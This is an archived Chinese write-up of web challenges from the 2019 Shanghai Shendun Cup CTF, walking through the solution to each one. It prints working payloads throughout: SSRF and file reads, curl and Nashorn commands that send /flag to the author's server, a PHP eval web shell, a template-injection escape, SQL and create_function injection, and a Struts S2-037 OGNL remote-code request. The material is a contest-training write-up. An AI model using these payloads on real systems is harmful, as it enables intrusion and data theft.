# 2019上海市神盾杯
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|中|

# 题目下载：
+ 暂无

# 网上公开WP:
+ https://xz.aliyun.com/t/5417
+ https://mochazz.github.io/2019/06/14/2019神盾杯上海市网络安全竞赛Web题解/
+ https://skysec.top/2019/07/03/2019%20%E7%A5%9E%E7%9B%BE%E6%9D%AF%20final%20Writeup%EF%BC%881%EF%BC%89/
+ https://skysec.top/2019/07/04/2019-%E7%A5%9E%E7%9B%BE%E6%9D%AF-final-Writeup%EF%BC%882%EF%BC%89/

# 本站备份WP：
**感谢作者：七月火**

## WEB
### easyadmin

cookie使用了jwt，爆破key并伪造role值为admin，登陆即可获得flag

![](https://ctfwp.wetolink.com/2019shendun/0.png)

### easygallery-1

HTML源码里面提示

`<?php $flag='flag in the /flag';?>`

还有一个如下链接：`http://xxxx/gallery.php?path=http://127.0.0.1:8082/gallery/static/img/portfolio-1.jpg`

猜测可能是SSSRF读取/flag。先在自己VPS上随便写一个 `<?php phpinfo();?>`，然后让题目尝试加载

`http://xxxx/gallery.php?path=http://VPS/index.php` 发现是空的，怀疑是不是有后缀jpg限制，所以尝试 `http://xxxx/gallery.php?path=http://VPS/index.php%23.jpg`

发现题目成功访问了我的VPS，并获得了PHPINFO内容。那么接下来就同样尝试使用file协议读取/flag。这里之所以加一个%23，是因为在HTML中，%23是锚点，所以后端程序获得的path参数对应的值为file:///flag，而加了%23.jpg又可以绕过题目限制。还可以看一下后端是使用什么程序发起请求的：

![](https://ctfwp.wetolink.com/2019shendun/1.png)

最终payload：`http://xxxx/gallery.php?path=file:///flag%23.jpg`

### easygallery-2

同样，在HTML源码里面有这样一个链接

[http://xxx/download.php?f=http://127.0.0.1/img/portfolio-1.jpg](http://xxx/download.php?f=http://127.0.0.1/img/portfolio-1.jpg)  
这次再使用file:///flag%23.jpg 会提示scheme error!，说明后端代码可能禁用了file协议。使用上题相同的方法，可以发现后台使用的是curl来访问我们的VPS。

![](https://ctfwp.wetolink.com/2019shendun/2.png)

猜测后台可能是直接用拼接字符串，然后执行curl命令。尝试访问 [http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+mochazz%23.jpg](http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+mochazz%23.jpg) 发现其请求是 POST方式，所以这题很有可能是命令执行。

![](https://ctfwp.wetolink.com/2019shendun/3.png)

尝试使用 [http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+/flag%23.jpg](http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+/flag%23.jpg) 没有获得flag，继续尝试curl的-F参数。最终payload：  
[http://xxxx/download.php?f=http://VPS/index.php+-F+myflag=@/flag+-F+x=mochazz.jpg](http://xxxx/download.php?f=http://VPS/index.php+-F+myflag=@/flag+-F+x=mochazz.jpg)

![](https://ctfwp.wetolink.com/2019shendun/4.png)

### easyupload

上传文件后没有回显文件地址，但以base64图片形式显示。page参数存在文件包含，但是过滤了://无法使用php伪协议读取源码。后台代码应该类似 `include $_GET['page'].'.php';` 。上传zip文件时，还会显示显示不允许的文件类型!upload jpg or gif。

![](https://ctfwp.wetolink.com/2019shendun/5.png)

上传图片处还有一个功能，可以填在线图片地址，我们可以通过这里结合file协议读取/etc/passwd

![](https://ctfwp.wetolink.com/2019shendun/6.png)

源码里面base64解密就是文件内容。尝试读取 /var/www/html/index.php 等文件都失败了，可能网站路径不是这个。但是我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html

![](https://ctfwp.wetolink.com/2019shendun/7.png)

file:///proc/self/cwd/index.php

![](https://ctfwp.wetolink.com/2019shendun/8.png)

file:///proc/self/cwd/upload.php

![](https://ctfwp.wetolink.com/2019shendun/9.png)

这题我们前面说过可以直接添加GIF89a上传图片马，接下来就是要找到图片路径了。

路径定义在upload.php中，关键代码如下：

```
$name= $_FILES['pic']['name'];
$ext = pathinfo($name,PATHINFO_EXTENSION);
$filename=basename($name,$ext);
$rootpath=$ddir.md5($filename).".".$name;
```

这样我们就可以获得图片路径了 `/proc/self/cwd/$rootpath` 。接下来直接利用题目最开始的文件包含 [http://xxxx/index.php?page=submit](http://xxxx/index.php?page=submit) 但是这里还有一个坑。坑在upload.php中有这样一段代码：

```
if(preg_match('/^ph(.*)$/i',$ext)){
 if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml','phps'])) {
 file_put_contents($rootpath,preg_replace("/\?/","",file_get_contents($rootpath)));
 }
}
```

会把文件中的 `?` 号给去掉，所以我们不能用 `<?php phpcode;?>` 这种写法，而要用 `<script language="php">phpinfo();@eval($_GET[_]);</script>` 接着直接包含即可执行命令：）当然，也可以不使用包含，直接访问马的路径。

![](https://ctfwp.wetolink.com/2019shendun/10.png)

### fast_calc_2

请求包类似：

```
POST /calc.php HTTP/1.1
Host: b4b74052eed440eb9c7899c932f61b6ce79f555733524dc2.changame.ichunqiu.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; UM_distinctid=16b3177db8f50f-05893ba84daad1-1b29140e-100200-16b3177db90396; pgv_pvi=517607424; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1559903068,1560408162; __jsluid=ab86d4cd5c34bd66f80a8891dc2e731e; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1560434036
Connection: close
Content-Type: application/json
Content-Length: 27

{"target":"/","expr":"1+1"}
```

fuzz一下，发现可能是python的SSTI

![](https://ctfwp.wetolink.com/2019shendun/11.png)

发现ban了 `[]` ，于是本地测成功一个payload

''.__getattribute__('__class__').__base__.__getattribute__(().__class__.__mro__.__getitem__(1),'__subc'+'lasses__')().__getitem__(40)('/flag').__getattribute__('read')()

但是题目提示没有 `__base__` 属性，怀疑该属性应该是被ban了。

![](https://ctfwp.wetolink.com/2019shendun/12.png)

后来队友测出直接用open方法，用空格隔开方法名和括号即可直接读取flag。

![](https://ctfwp.wetolink.com/2019shendun/13.png)

然后看了一下源码

/proc/self/cwd/calc.php

```
<?php
$data = file_get_contents('php://input');
$data = json_decode($data,true);
$encode_data = base64_encode($data['expr']);
system('python ./final.py '.$encode_data);
?>
```

/proc/self/cwd/final.py

![](https://ctfwp.wetolink.com/2019shendun/14.png)

### fast_calc_1

初步判断，后端代码可能用的是nodejs或者JavaScript。

![](https://ctfwp.wetolink.com/2019shendun/15.png)

尝试用Object.getOwnPropertyNames(this).join('::::::')读取一下this对象属性，发现有java

![](https://ctfwp.wetolink.com/2019shendun/16.png)

再次尝试java.language.String，可以确认后端用的是Java了

![](https://ctfwp.wetolink.com/2019shendun/17.png)

Java中有一个新特性可以把JavaScript转成Java代码，所以这里可以执行JavaScript，即Nashorn  
接下来尝试使用java代码读取flag

POST /calc.php HTTP/1.1
Host: xxx
Content-Type: application/json

{"target":"/","expr":"java.lang.Runtime.getRuntime().exec('curl VPS -d @/flag')"}

![](https://ctfwp.wetolink.com/2019shendun/18.png)

### easysqli

两个点：

+ username和password经过addslashes函数处理。
+ 当username为admin时，会显示后台执行的sql语句。

![](https://ctfwp.wetolink.com/2019shendun/19.png)

利用条件比较苛刻，所以正常的SQL注入姿势是绕不过的，只能想到配合sprintf字符串格式化漏洞进行绕过，具体参考：[https://paper.seebug.org/386/](https://paper.seebug.org/386/) 。猜测后台代码应该类似这样：

```
$user = addslashes($_GET['user']);
$pass = addslashes($_GET['pass']);
$sql = sprintf("select * from users where username='%s' and password='$pass'",$user);
```

最终利用payload： `http://xxxx//result.php?user=admin&pass=%1$'=0#`

![](https://ctfwp.wetolink.com/2019shendun/20.png)

### parser

题目附件：
[https://pan.baidu.com/share/init?surl=2_-7WPVSIgf7uCQuPk2wMA](https://pan.baidu.com/share/init?surl=2_-7WPVSIgf7uCQuPk2wMA) 密码：qppg

我们需要把解析后的AST文件翻译成PHP代码。

![](https://ctfwp.wetolink.com/2019shendun/21.png)

比如上面这段代码，翻译成PHP代码类似：

```
try {
 ('var_'.$_GET['num'])('cat /flag');
} catch (Exception $e) {}
```

具体参考：[https://github.com/nikic/PHP-Parser/blob/master/grammar/php5.y](https://github.com/nikic/PHP-Parser/blob/master/grammar/php5.y)

上面的代码告诉我们，肯定有一个变量var_xxx其值可以为命令执行函数，例如：system函数。那么我们先来看一下这些var_xxx变量的命名规则：

![](https://ctfwp.wetolink.com/2019shendun/22.png)

可以看到 `var_` 后面基本上跟的都是数字，那这题就很简单了，直接用BurpSuite爆破就行了。如果这题`var_` 后面跟的是不规则的字符，那可能就要全部还原一下PHP代码了。

![](https://ctfwp.wetolink.com/2019shendun/23.png)

### easymanager

题目提示：一个内部站点 所以可能存在内网。注册用户后登录，查看页面源代码会发现一个hint  
hint: function.php source code may help u 发现存在 `function.php~` 文件。

![](https://ctfwp.wetolink.com/2019shendun/24.png)

访问 [http:///xxxxxx/index.php?page=host](http:///xxxxxx/index.php?page=host) ，会提示Permission Deny! 根据上面代码开头check_url函数可知，程序使用parse_url来解析url，而parse_url函数存在bypass。于是访问 [http:///xxxxxx///index.php?page=host](http:///xxxxxx///index.php?page=host)

![](https://ctfwp.wetolink.com/2019shendun/25.png)

虽然是显示404，但是这个页面的源码中又有提示：

```
<!-- Under repair .. host page can be access temporarily via 70b185c80f225924f86d4a1dedddd120.php -->
```

直接访问[http://xxxx/70b185c80f225924f86d4a1dedddd120.php](http://xxxx/70b185c80f225924f86d4a1dedddd120.php) 会提示you can not visit it directly。所以我们要 [http://xxxx/index.php?page=70b185c80f225924f86d4a1dedddd120](http://xxxx/index.php?page=70b185c80f225924f86d4a1dedddd120) 这样访问。  
发现可以上传zip格式文件，那就可以考虑一下zip协议。上传一个zip压缩马，会发现其会读取zip文件的内容。

![](https://ctfwp.wetolink.com/2019shendun/26.png)

那么我们可以尝试创建软链接文件，将其打包成zip并上传，这样就可以读取网站源码了。例如下面读取index.php源码。

![](https://ctfwp.wetolink.com/2019shendun/27.png)

![](https://ctfwp.wetolink.com/2019shendun/28.png)

index.php

![](https://ctfwp.wetolink.com/2019shendun/29.png)

host.php、function.php

![](https://ctfwp.wetolink.com/2019shendun/30.png)

/etc/apache2/sites-available/000-default.conf

![](https://ctfwp.wetolink.com/2019shendun/31.png)

尝试读取 `/flag` 没读到。发现/etc/apache2/sites-available/000-default.conf中有/var/www/html/m4nag3r_u_dont_know目录，访问[http://xxxx/m4nag3r_u_dont_know/index.php](http://xxxx/m4nag3r_u_dont_know/index.php) 出错，那么尝试读取/var/www/html/m4nag3r_u_dont_know/index.php源码

// /var/www/html/m4nag3r_u_dont_know/index.php
```
<?php
create_function($_REQUEST['func'],'flag');
?>
```

最后就是create_function代码注入了  
[http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27ls%20/%27);//](http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27ls%20/%27);//)

![](https://ctfwp.wetolink.com/2019shendun/32.png)

[http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27cat%20/flag_e10adc3949ba59abbe56e057f20f883e%27);//](http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27cat%20/flag_e10adc3949ba59abbe56e057f20f883e%27);//)

![](https://ctfwp.wetolink.com/2019shendun/33.png)

### cat market

一开始，我们会发现证书有问题，而且无法正常访问网站。

![](https://ctfwp.wetolink.com/2019shendun/34.png)

我们需要修改本地host，将where_is_my_cat.ichunqiu.com指向题目地址。在COOKIE中还会看到HOST字段，也把它设置成where_is_my_cat.ichunqiu.com，然后就可以正常访问网站了。

![](https://ctfwp.wetolink.com/2019shendun/35.png)

我们会发现网站底部有一个/source_code_version_1.tgz ，下下来审计。这里主要发现两个漏洞点。

**第一个点：竞争漏洞**

首先我们看下面注册和登录两段代码，注册的时候会执行两条SQL语句，其中一条会将locked字段设置为1。而登录的时候，会判断用户所对应的locked字段。如果为1，则表示用户被锁定并直接退出程序。

![](https://ctfwp.wetolink.com/2019shendun/36.png)

这样看来，好像我们即使注册了用户，也无法登录进去。但是，如果我们开启多个线程同时注册登录，那么就有可能登录进去，这就利用了竞争漏洞。我们在对数据进行增删改的时候，要给它加一把锁，避免此时用户读到脏数据（本该读取修改后的值，却读取了修改前的值）。关于竞争漏洞的解释，还可以参考这篇文章： [https://seaii-blog.com/index.php/2017/04/26/49.html](https://seaii-blog.com/index.php/2017/04/26/49.html)

而上面的代码，我们可以通过多线程的方式，同时进行注册和登录，在执行update locked之前查询用户的 locked 字段，，从而拿到用户的cookie信息。具体代码如下：

```
import requests,time
import threading,random
reg_url = "https://where_is_my_cat.ichunqiu.com:8006/checkregister.php"
log_url = "https://where_is_my_cat.ichunqiu.com:8006/checklogin.php"
cookies = {
    "HOST" : "where_is_my_cat.ichunqiu.com"
}
def register(username,password):
    data = {
        "username" : username,
        "password" : password,
        "code" : int(time.time())
    }
    r = requests.post(url=reg_url, data=data, cookies=cookies, verify=False)

def login(username,password):
    data = {
        "username" : username,
        "password" : password,
    }
    s = requests.session()
    r = s.post(url=log_url, data=data, cookies=cookies, verify=False)
    print("===============================================================\n")
    print(r.cookies)
    print("===============================================================\n\n")

while True:
    username = "moch33" + str(random.randint(1,100000))
    threading.Thread(target=register, args=(username,"mochazz")).start()
    threading.Thread(target=login, args=(username,"mochazz")).start()
```

![](https://ctfwp.wetolink.com/2019shendun/37.png)

**第二个点：SSRF**

在market.php文件中，有一处重定向，我们只需要绕过is_cat函数中的规则，即可利用这个功能进行SSRF。

![](https://ctfwp.wetolink.com/2019shendun/38.png)

而且redirect.php中还存在一个重定向，刚好可以结合绕过上面的规则限制。规则要求url以图片格式结尾，我们可以使用 `?、#、&` 等等符号来绕过。

// redirect.php

```
<?php
if(isset($_GET['u'])){
    header("Location: ".$_GET['u'].".php");
    $log = date("Y-m-d H:i:s")." : ".$_SERVER[REMOTE_ADDR]." redirect to: ".$_GET['u'].".php\n\r";
    file_put_contents("log.txt",$log,FILE_APPEND);
}else{
    header("Location: index.php");
}
```

接下来可以开始探测一波常用端口，看看上面有没其他web服务，然后会发现8080端口上运行这tomcat+struts2。

![](https://ctfwp.wetolink.com/2019shendun/39.png)

测一下Struts的漏洞，发现S2-037可用。

![](https://ctfwp.wetolink.com/2019shendun/40.png)

```
GET /market.php?url=https://where_is_my_cat.ichunqiu.com/redirect.php%3Fu%3Dhttp%253A//127.0.0.1%253A8080/struts2-rest-showcase/orders/3/%2528%252523_memberAccess%25253d%2540ognl.OgnlContext%2540DEFAULT_MEMBER_ACCESS%2529%25253f%2528%252523wr%25253d%252523context%25255b%252523parameters.obj%25255b0%25255d%25255d.getWriter%2528%2529%252C%252523rs%25253d%2540org.apache.commons.io.IOUtils%2540toString%2528%2540java.lang.Runtime%2540getRuntime%2528%2529.%252565%252578%252565%252563%2528%252523parameters.command%255B0%255D%2529.getInputStream%2528%2529%2529%252C%252523wr.println%2528%252523rs%2529%252C%252523wr.flush%2528%2529%252C%252523wr.close%2528%2529%2529%253Axx.toString.json%253F%2526obj%253Dcom.opensymphony.xwork2.dispatcher.HttpServletResponse%2526content%253D233%2526command%253Dcat%252520/flag%2526%23mochazz.jpg HTTP/1.1
Host: where_is_my_cat.ichunqiu.com:8006
Cookie: PHPSESSID=fkotbsvfhbdrfbjotnhbtriuq0; HOST=where_is_my_cat.ichunqiu.com
```

# 评论区
**请文明评论，禁止广告**
<img src="https://ctfwp.wetolink.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  

---